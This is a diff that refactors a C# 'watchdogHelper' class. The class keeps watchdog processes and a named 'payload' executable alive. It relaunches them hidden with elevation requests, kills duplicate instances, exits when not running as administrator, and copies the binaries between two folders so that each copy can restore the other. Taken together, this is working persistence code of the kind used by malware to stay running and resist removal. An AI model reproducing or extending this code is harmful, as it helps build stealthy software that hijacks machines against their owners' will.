@@ -1,309 +1,233 @@
 ﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
-using WindowsFirewallHelper;
 
+public static class watchdogHelper
+{
+    #region Logging
 
-public class watchdogHelper
+    public static void Log(string message)
     {
+        if (Config.Debugging)
+            Console.WriteLine($"[Watchdog] {message}");
+    }
 
-        private static bool IsMutexRunning(string mutexName)
-        {
-            bool isNewInstance;
+    #endregion
+
+    #region Process & Mutex Checks
+
+    private static bool IsMutexRunning(string mutexName)
+    {
         try
         {
-            // Attempt to create a mutex with the specified name
-            using (Mutex mutex = new Mutex(false, "Global\\" + mutexName, out isNewInstance))
-            {
-                // If a new instance was created, it means no other instance was running
-                if (isNewInstance)
-                {
-                    // Release the mutex so it's not held by this check
-                    return false;
-                }
-                else
-                {
-                    // If we couldn't create a new instance, another instance is already running
-                    return true;
-                }
-            }
+            using var mutex = new Mutex(false, "Global\\" + mutexName, out bool isNewInstance);
+            return !isNewInstance;
         }
-        catch (Exception ex) {
-            Log($"Error verifying if mutex is running: {ex.Message}");
+        catch (Exception ex)
+        {
+            Log($"Error verifying mutex: {ex.Message}");
             return false;
         }
-        }
+    }
 
-    private static bool IsProcessRunning(string processName)//does processes by name when mutex cant be used (for the payload)
-        {
-            try
-            {
-                // Get a list of processes by name
-                processName = processName.Replace(".exe", "");
-            }catch (Exception ex){
-                Log($"Error getting list of running processes: {ex.Message}");
-            }
-                Process[] processes = Process.GetProcessesByName(processName); 
-                return processes.Length > 0;
-        }
-
-        public static void Log(string message)
-        {
-            if (Config.Debugging)
-            { //logs when specified by user in Config
-                Console.WriteLine(message);
-            }
-        }
-      
-        private static void runBinary(string filePath, string arguments = "")
-        {
+    private static bool IsProcessRunning(string processName)
+    {
         try
         {
-            ProcessStartInfo startInfo = new ProcessStartInfo
-            {
-                FileName = filePath,
-                UseShellExecute = false,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                CreateNoWindow = true,
-                Verb = "runas" // Request elevated privileges
-            };
+            string name = Path.GetFileNameWithoutExtension(processName);
+            return Process.GetProcessesByName(name).Length > 0;
+        }
+        catch (Exception ex)
+        {
+            Log($"Error checking process '{processName}': {ex.Message}");
+            return false;
+        }
+    }
 
-            using (Process process = new Process())
-            {
-                process.StartInfo = startInfo;
-                process.Start();
-            }
-        }
-        catch (Exception ex) { 
-        Log($"Error Running Binary: {ex.Message}");
-        }
-        }
     public static bool KillProcessById(int pid)
     {
         try
         {
-            Process process = Process.GetProcessById(pid);
-            process.Kill();
-            process.WaitForExit();// waits for exit to avoid issues with claimed mutex
+            var process = Process.GetProcessById(pid);
+            process.Kill(true);
+            process.WaitForExit();
             process.Dispose();
             return true;
         }
         catch (ArgumentException)
         {
-            watchdogHelper.Log("No process with the specified PID is running.");
+            Log($"No process with PID {pid} exists.");
         }
         catch (Exception ex)
         {
-            watchdogHelper.Log($"Failed to kill process: {ex.Message}");
+            Log($"Failed to kill process {pid}: {ex.Message}");
         }
         return false;
     }
 
+    #endregion
+
+    #region Privilege Checks
+
     public static void EnsureHighestPriv(bool isNewInstance)
     {
-        bool isElevated = watchdogHelper.IsElevated();
+        if (isNewInstance) return; // nothing to do if this is the new instance
 
-        if (!isNewInstance && isElevated)// if this process is admin or system and not a new instance
-        {
-
-            watchdogHelper.Log("Another instance of the watchdog is already running.");
-
-            List<Process> processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).ToList<Process>(); // get a list of Processes with the same name as the current process
-
-            int? currentID = Process.GetCurrentProcess().Id;
-
-            foreach (Process process in processes){
-                if(process.Id == currentID)
-                {
-                    processes.Remove(process);
-                } // remove current process from the list
-            }
-
-            if (processes.Count > 1) // kill every other process except one
-            {
-                for (int i = 1; i < processes.Count; i++)
-                {
-                    KillProcessById(processes[i].Id);
-                }
-            }
-
-            int otherProcessID = processes[1].Id;
-            if (IsPIDElevated(otherProcessID))
-            {
-                Environment.Exit(0);
-            }
-            else
-            {
-                KillProcessById(otherProcessID);
-            }
-        }
-        else if (!isNewInstance)
+        if (!IsElevated())
         {
             Environment.Exit(0);
         }
 
-        // Call the main watchdog logic
-        if (isNewInstance)
+        // Kill duplicate processes, keep only the current one
+        string currentName = Process.GetCurrentProcess().ProcessName;
+        int currentId = Process.GetCurrentProcess().Id;
+        var duplicates = Process.GetProcessesByName(currentName).Where(p => p.Id != currentId).ToList();
+
+        foreach (var p in duplicates)
         {
-            return;
+            if (IsPIDElevated(p.Id)) Environment.Exit(0);
+            KillProcessById(p.Id);
         }
-        else
-        {
-            Environment.Exit(0);
-        }
+
+        Log("Ensured highest privileges and single instance.");
     }
-    public static bool IsElevated() // detects whether the program is running as system or administrator
+
+    public static bool IsElevated()
     {
-        WindowsIdentity identity = WindowsIdentity.GetCurrent();
-        WindowsPrincipal principal = new WindowsPrincipal(identity);
-        bool isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator) || principal.IsInRole(WindowsBuiltInRole.SystemOperator);
-        return isElevated;
+        var identity = WindowsIdentity.GetCurrent();
+        var principal = new WindowsPrincipal(identity);
+        return principal.IsInRole(WindowsBuiltInRole.Administrator) || principal.IsInRole(WindowsBuiltInRole.SystemOperator);
     }
 
-    private static bool IsPIDElevated(int processHandle)
+    private static bool IsPIDElevated(int pid)
     {
         IntPtr tokenHandle = IntPtr.Zero;
         try
         {
-            if (OpenProcessToken((IntPtr)processHandle, TOKEN_QUERY, out tokenHandle))
-            {
-                var elevation = new TOKEN_ELEVATION();
-                int elevationSize = Marshal.SizeOf(typeof(TOKEN_ELEVATION));
-                IntPtr elevationPtr = Marshal.AllocHGlobal(elevationSize);
+            if (!OpenProcessToken((IntPtr)pid, TOKEN_QUERY, out tokenHandle)) return false;
 
-                try
+            var elevation = new TOKEN_ELEVATION();
+            int size = Marshal.SizeOf<TOKEN_ELEVATION>();
+            IntPtr ptr = Marshal.AllocHGlobal(size);
+
+            try
+            {
+                if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, ptr, size, out _))
                 {
-                    if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, elevationSize, out _))
-                    {
-                        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION))!;
-                        return elevation.TokenIsElevated != 0;
-                    }
+                    elevation = Marshal.PtrToStructure<TOKEN_ELEVATION>(ptr);
+                    return elevation.TokenIsElevated != 0;
                 }
-                finally
-                {
-                    Marshal.FreeHGlobal(elevationPtr);
-                }
+                return false;
             }
-            return false;
+            finally
+            {
+                Marshal.FreeHGlobal(ptr);
+            }
         }
         finally
         {
-            if (tokenHandle != IntPtr.Zero)
-            {
-                CloseHandle(tokenHandle);
-            }
+            if (tokenHandle != IntPtr.Zero) CloseHandle(tokenHandle);
         }
     }
 
-    // WinAPI functions and constants
+    #endregion
+
+    #region File / Directory Helpers
+
+    public static void EnsureDirectoryExists(string dirPath)
+    {
+        try
+        {
+            Directory.CreateDirectory(dirPath);
+        }
+        catch (Exception ex)
+        {
+            Log($"Failed to create directory '{dirPath}': {ex.Message}");
+        }
+    }
+
+    public static void VerifyFilePathsSourceAndDest(string destinationPath, string filename)
+    {
+        try
+        {
+            string cwd = Directory.GetCurrentDirectory();
+            string src = Path.Combine(cwd, filename);
+            string dest = Path.Combine(destinationPath, filename);
+
+            EnsureDirectoryExists(destinationPath);
+
+            if (File.Exists(dest) || File.Exists(src))
+            {
+                if (!File.Exists(dest) && File.Exists(src))
+                    File.Copy(src, dest, overwrite: false);
+                else if (!File.Exists(src) && File.Exists(dest))
+                    File.Copy(dest, src, overwrite: false);
+            }
+            else
+            {
+                Log($"File '{filename}' not found in either source or destination.");
+            }
+        }
+        catch (Exception ex)
+        {
+            Log($"Error verifying file paths for '{filename}': {ex.Message}");
+        }
+    }
+
+    public static void RunBinary(string filePath, string arguments = "")
+    {
+        try
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = filePath,
+                Arguments = arguments,
+                UseShellExecute = true,         // ensures it runs as independent top-level process
+                CreateNoWindow = true,          // hides any console window
+                WindowStyle = ProcessWindowStyle.Hidden,
+                Verb = "runas"                  // request elevation
+            };
+
+            Process.Start(startInfo);
+        }
+        catch (Exception ex)
+        {
+            Log($"Error Running Binary: {ex.Message}");
+        }
+    }
+
+    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
+    {
+        if (!IsMutexRunning(mutex))
+            RunBinary(Path.Combine(watchdogPath, watchdogName));
+    }
+
+    public static void CheckAndRunPayload(string payloadPath, string payloadName)
+    {
+        if (!IsProcessRunning(payloadName))
+            RunBinary(Path.Combine(payloadPath, payloadName));
+    }
+
+    #endregion
+
+    #region WinAPI
+
     private const int TOKEN_QUERY = 0x0008;
 
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);
 
     [DllImport("advapi32.dll", SetLastError = true)]
-    private static extern bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr tokenInfo, int tokenInfoLength, out int returnLength);
+    private static extern bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass,
+        IntPtr tokenInfo, int tokenInfoLength, out int returnLength);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern bool CloseHandle(IntPtr hObject);
 
-    private enum TOKEN_INFORMATION_CLASS
-    {
-        TokenElevation = 20
-    }
+    private enum TOKEN_INFORMATION_CLASS { TokenElevation = 20 }
 
     [StructLayout(LayoutKind.Sequential)]
-    private struct TOKEN_ELEVATION
-    {
-        public int TokenIsElevated;
-    }
-    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
-        {
-            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
-            {
-                    runBinary(Path.Combine(watchdogPath, watchdogName));
-                }
-            }
+    private struct TOKEN_ELEVATION { public int TokenIsElevated; }
 
-        public static void CheckAndRunPayload(string payloadPath, string payloadName)
-        {
-            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
-        {
-                runBinary(Path.Combine(payloadPath, payloadName));
-            }
-        }
-
-        public static void EnsureDirectoryExists(string dirPath)
-        {
-            try
-            {
-                if (!Directory.Exists(dirPath))
-                {
-                    Directory.CreateDirectory(dirPath);
-                }
-            }
-            catch (Exception ex)
-            {
-                Log($"An error occurred while creating the directory: {ex.Message}");
-            }
-        }
-    public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
-    {
-        try
-        {
-            string currentDirectory = Directory.GetCurrentDirectory();
-            string sourcePathFile = Path.Combine(currentDirectory, filename);
-            string destPathFile = Path.Combine(destinationPath, filename);
-
-
-            EnsureDirectoryExists(destinationPath);
-
-
-            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
-            {
-                return;
-            }
-            else
-            {
-
-                if (File.Exists(sourcePathFile))
-                {
-                    // Copy the .exe to the destination
-                    try
-                    {
-                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
-                        Log($"'{filename}' found and copied to {destPathFile}");
-                    }
-                    catch (Exception ex)
-                    {
-                        Log($"Error copying file: {ex.Message}");
-                    }
-                }
-                else if (File.Exists(destPathFile))
-                {
-                    try
-                    {
-                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
-                        Log($"'{filename}' found and copied to {sourcePathFile}");
-                    }
-                    catch (Exception ex)
-                    {
-                        Log($"Error copying file: {ex.Message}");
-                    }
-                }
-                else
-                {
-                    Log($"'{filename}' not found in the current directory.");
-                }
-            }
-        }
-        catch (Exception ex)
-        {
-            Log($"Error verifying and copying filepaths: {ex.Message}");
-        }
-    }
-
+    #endregion
 }
-        
-    
